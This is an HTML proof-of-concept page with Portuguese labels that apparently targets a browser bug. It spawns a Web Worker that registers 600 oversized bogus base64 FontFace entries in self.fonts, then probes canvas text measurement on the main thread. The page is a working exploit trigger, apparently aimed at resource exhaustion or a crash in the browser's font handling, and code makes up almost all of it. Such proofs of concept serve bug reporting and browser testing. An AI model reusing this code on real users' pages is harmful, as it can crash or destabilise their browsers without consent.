<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>POC Worker self.fonts (sem OffscreenCanvas)</title>
</head>
<body>
  <button id="runBtn" type="button">Executar POC</button>
  <pre id="log"></pre>

  <script>
    const logEl = document.getElementById('log');
    function log(msg) {
      logEl.textContent += msg + '\n';
    }

    const canvas = document.createElement('canvas');
    canvas.width = 64;
    canvas.height = 64;
    const ctx = canvas.getContext('2d');

    const workerSrc = `
      self.onmessage = async function(ev) {
        const rounds = ev.data.rounds || 8;
        const perRound = ev.data.perRound || 75;
        const payload = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
        let totalAdded = 0;
        let totalLoaded = 0;

        for (let r = 0; r < rounds; r++) {
          const promises = [];
          for (let i = 0; i < perRound; i++) {
            const fam = 'f_' + r + '_' + i;
            const ff = new FontFace(fam, payload, { unicodeRange: 'U+13A0-13FF' });
            self.fonts.add(ff);
            totalAdded++;
            promises.push(
              ff.load().then(
                function() { totalLoaded++; },
                function() {}
              )
            );
          }
          await Promise.all(promises);
        }

        self.postMessage({
          done: true,
          added: totalAdded,
          loaded: totalLoaded,
          fontsSize: self.fonts.size
        });
      };
    `;

    const blob = new Blob([workerSrc], { type: 'application/javascript' });
    const workerUrl = URL.createObjectURL(blob);
    const worker = new Worker(workerUrl);

    function probeMainCanvas() {
      if (!ctx) return;
      for (let i = 0; i < 450; i++) {
        ctx.font = (10 + (i % 20)) + 'px "p_' + i + '", "f_0_0", sans-serif';
        ctx.measureText('\u13A0\u13A2\u13A4');
      }
    }

    worker.onmessage = function(ev) {
      log('Worker finalizou: ' + JSON.stringify(ev.data));
      probeMainCanvas();
      log('Sondagem em canvas concluida.');
    };

    worker.onerror = function(e) {
      log('Erro no Worker: ' + (e.message || 'desconhecido'));
    };

    document.getElementById('runBtn').addEventListener('click', function() {
      log('Disparando teste...');
      probeMainCanvas();
      worker.postMessage({ rounds: 8, perRound: 75 });
    });
  </script>
</body>
</html>
